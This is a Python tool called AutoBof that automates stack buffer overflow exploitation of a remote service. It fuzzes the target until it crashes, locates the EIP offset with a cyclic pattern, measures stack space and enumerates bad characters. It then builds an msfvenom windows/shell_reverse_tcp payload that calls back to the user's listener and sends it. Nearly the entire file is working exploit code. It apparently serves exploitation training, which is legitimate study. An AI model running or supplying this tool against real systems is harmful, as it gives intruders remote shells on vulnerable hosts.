#!/usr/bin/python3

################################################################################################################
# Title: AutoBof											       #
# Description: A tool for automating buffer overflow exploitation.   					       #
# Created: 20 February 2021										       #
# Last Modified: 10 March 2021										       #
# By: Tarynhacks											       #
################################################################################################################

import subprocess, socket, time, binascii, argparse, sys, colorama
from colorama import init, Fore

parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help = "target ip address", required = True)
parser.add_argument("--rport", help = "target port", required = True)
parser.add_argument("--prefix", help = "string prefix [default: \"\"]", default = "")
parser.add_argument("--suffix", help = "string suffix [default: \"\"]", default = "")
parser.add_argument("--lhost", help = "listening ip address [default: tun0]", default = "tun0")
parser.add_argument("--lport", help = "listening port [default: 443]", default = 443)

args = parser.parse_args()

rhost = args.rhost
rport = int(args.rport)
pfx = args.prefix.encode()
sfx = args.suffix.encode()
lhost = args.lhost
lport = int(args.lport)

h = ('0123456789ABCDEFabcdef')
nops = b'\x90'
colorama.init()
init(autoreset=True)

R = "\033[91m"
Y = "\033[93m"
G = "\033[92m"
W = "\033[01m"

class AutoBof():
	def __init__(self):
		pass

	def send_bytes(self, data):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(3)
		s.connect((rhost, rport))
		if type(data) is str:
			data = data.encode()
		print(s.recv(1024).decode())
		s.send(pfx + data + sfx)
		print(s.recv(1024).decode())
		s.close()

	def fuzz(self):
		buffer = []
		counter = 100
		while len(buffer) < 30:
			buffer.append('A' * counter)
			counter += 100
		for string in buffer:
			try:
				print(f"{W}[+] Fuzzing with {str(len(string))} bytes...{W}")
				self.send_bytes(string + "\r\n")
				time.sleep(1)
			except ConnectionRefusedError as e:
				sys.exit(f"{R}\n[-] Can't connect.{R}")
			except socket.timeout:
				print(f"{G}[+] Crashed at offset {str(len(string))}!{G}")
				return len(string)

	def offset(self):
		offset = self.fuzz()
		input(f"{Y}[!] WAITING - [Restart the app]{Y}" + Fore.RESET)
		try:
			p = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
			self.send_bytes('A' * (offset - 100) + p + '\r\n')
		except ConnectionRefusedError:
			sys.exit(f"{R}\n[-] Can't connect.{R}")
		except socket.timeout:
			print(f"{G}\n[+] Crashed at offset {offset}!{G}{Y}\n[!] - WAITING - Check EIP{Y}")
		eip = input("EIP: ")
		eip = self.little_endian(eip, "EIP: ")
		try:
			p.index(bytes.fromhex(eip).decode())
		except ValueError:
			eip = self.little_endian(eip, "")
			sys.exit(f"{R}\n[-] Unable to find a matching offset at address 0x{eip}.{R}" )
		else:
			offset = (offset - 100) + p.index(bytes.fromhex(eip).decode())
			print(f"{G}\n[+] Identified exact offset at {offset}!{G}")
			return offset

	def little_endian(self, e, s):
		e = self.check_address(e, s)
		e = [e[i:i+2] for i in range(0,8, 2)]
		e.reverse()
		return ''.join(e)

	def check_address(self, a, s):
		while len(a) !=8 or any((char not in h) for char in a):
			print(f"{Y}\n[!] INVALID FORMAT - Re-enter address in form of 01AB23CD.{Y}")
			a = input(f"{s}")
		return a

	def check_space(self, offset):
		input(f"{Y}[!] WAITING - [Restart the app]{Y}" + Fore.RESET)
		try:
			print(f"{W}\n[+] Determining space in ESP...{W}")
			self.send_bytes('A' * offset + 'BBBB' + 'C' * 1000 + "\r\n")
		except ConnectionRefusedError:
			sys.exit(f"{R}\n[-] Can't connect.{R}")
		except socket.timeout:
			print(f"{G}\n[+] Crashed at offset {offset}!{G}{Y}\n[!] - WAITING - Check ESP{Y}")
		e = input("ESP: ")
		e = self.check_address(e, "ESP: ")
		print(f"{Y}\n[!] WAITING - Check last address containing C's in the stack window.{Y}")
		s = input("Last address: ")
		s = self.check_address(s, "Last address: ")
		space = int(s, 16) - int(e, 16)
		print(f"{G}\n[+] You have {space} bytes of space in ESP for a payload!{G}")
		return space

	def check_char(self, bcharlist, bc):
		if not bc:
			print(f"{G}\n[+] Badchars set!{G}")
			print(f"{''.join(bcharlist)}")
			return True
		if bc in bcharlist:
			print(f"{Y}\n[!] {bc} is already in your badchar list! - Re-enter badchar in form of \\x00.{Y}")
		elif len(bc) != 4 or bc[0] != '\\' or bc[1] != 'x' or bc[2] not in h or bc[3] not in h:
			print(f"{Y}\n[!] INVALID FORMAT - Re-enter badchar in form of \\x00.{Y}")
		else:
			bcharlist.append(bc)
			return True
		return False

	def generate_badchars(self, bad_chars, bc):
		bad_chars = binascii.hexlify(bad_chars).decode()
		bad_chars = bad_chars.replace(bc[2:], "")
		bad_chars = binascii.unhexlify(bad_chars.encode())
		return bad_chars

	def check_badchars(self, offset, space):
		bad_chars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
		bcharlist = ['\\x00']
		if space < (255 - 32):
			sys.exit(f"{R}\n[-] Not enough space to send all badchars at once.{R}")
		input(f"{Y}[!] WAITING - [Restart the app]{Y}" + Fore.RESET)
		for i in range(255):
			try:
				print(f"{W}\n[+] Sending badchar test...{W}")
				self.send_bytes(b'A'*offset + b'BBBB' + nops*16 + bad_chars + nops*16 + b"\r\n")
			except ConnectionRefusedError:
				sys.exit(f"{R}\n[-] Can't connect.{R}")
			except socket.timeout:
				print(f"{G}\n[+] Crashed at offset {offset}!{G}{Y}\n[!] - WAITING - Check badchars one at a time.{Y}")
				print("Hint: [right-click ESP > Follow in Dump]")
				print(f"{W}\n[+] Current badchar list: {''.join(bcharlist)}{W}")
				bc = input("Badchar [Press Enter if none left]: ").lower()
				while self.check_char(bcharlist, bc) == False:
					bc = input("Badchar [Press Enter if none left]: ").lower()
			if not bc:
				break
			bad_chars = self.generate_badchars(bad_chars, bc)
			input(f"{Y}\n[!] WAITING - [Restart the app]{Y}" + Fore.RESET)
		return ''.join(bcharlist), bcharlist

	def payload(self, offset, bcharlist_str):
		print(f"{Y}\n[!] WAITING - Choose your return address to overwrite EIP.{Y}")
		print("Hint: [!mona jmp -r esp -cpb '\\xYY\\xYY\\xYY' (insert badchars)]")
		eip = input("EIP: ")
		eip = self.little_endian(eip, "EIP: ")
		eip2 = eip
		eip = binascii.unhexlify(eip.encode())
		print(f"{W}\n[+] Assembling payload...{W}")
		try:
			cmd = f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -b \'{bcharlist_str}\' -f raw 2>/dev/null"
			shellcode = subprocess.check_output(cmd, shell=True)
			payload = b'A'*offset + eip + nops*16 + shellcode + nops*16 + b"\r\n"
			eip = f"\\x{eip2[:2]}\\x{eip2[2:4]}\\x{eip2[4:6]}\\x{eip2[6:]}"
			payload_str = f"({pfx} + b\'A\'*{offset} + b\'\\x{eip2[:2]}\\x{eip2[2:4]}\\x{eip2[4:6]}\\x{eip2[6:]}\' + b\'90\'*16 + <shellcode> + b\'90\'*16 + {sfx} + b\'\\r\\n\')"
			print(f"{G}\n[+] Assembled!{G}")
		except:
			sys.exit(f"{R}\nCan't assemble. Do you have msfvenom installed?{R}")
		return payload, payload_str, eip

	def exploit(self, payload):
		print(f"{W}\n[!] Remember to start your listener on port {lport}!{W}")
		input(f"{Y}[!] WAITING - [Restart the app]{Y}" + Fore.RESET)
		try:
			print(f"{W}\n[+] Sending exploit...{W}")
			self.send_bytes(payload)
		except ConnectionRefusedError:
			sys.exit(f"{R}\n[-] Can't connect.{R}")
		except socket.timeout:
			print(f"{G}\n[+] Exploit sent!{G}")

	def print_poc(self, offset, eip, space, bcharlist_str, payload_str, payload):
		print(f"{W}\n[+] Congrats, you autoboffed this box! Now try building the PoC on your own!{W}")
		print(f"{W}\nSummary:{W}")
		print(f"  EIP Offset: {offset} bytes")
		print(f"  EIP Overwrite: {eip}")
		print(f"  Space for payload: {space}")
		print(f"  Badchars found: {bcharlist_str}")
		print(f"  Payload sent: {payload_str}")
		#print(f"  Payload byte string: {payload}")

	#def build_poc(self, offset, space, bcharlist, payload):
		#print(f"{W}\n[+] AutoPoc-ing...{W}")
		# print("\n[+] Auto-creating PoC...")
		# print("\n[+] PoC created in /path/exploit.py!")
		#print("(To-Do)")

	def main(self):
		banner = """
_______     _______ ___________ ____________   ;
|_____|     |  |   |     |_____]     |______  ["]
|     |_____|  |   |_____|_____]_____|       /[~]\ By: Tarynhacks
			 """
		print(banner)
		time.sleep(2)
		offset = self.offset()
		space = self.check_space(offset)
		bcharlist_str, bcharlist = self.check_badchars(offset, space)
		payload, payload_str, eip = self.payload(offset, bcharlist_str)
		time.sleep(1)
		e = input("\nExploit? (Y/N): ")
		if(e == 'Y' or e == 'y'):
			self.exploit(payload)
		self.print_poc(offset, eip, space, bcharlist_str, payload_str, payload)
		#i = input("\nWould you like AutoBof to AutoPoc? (Y/N): ")
		#if(i == 'Y' or i == 'y'):
		#	self.build_poc(offset, space, bcharlist, payload)
		print("\nIt has been an honor serving you.\n\tAutobof, rollout.")

optimus = AutoBof()
optimus.main()
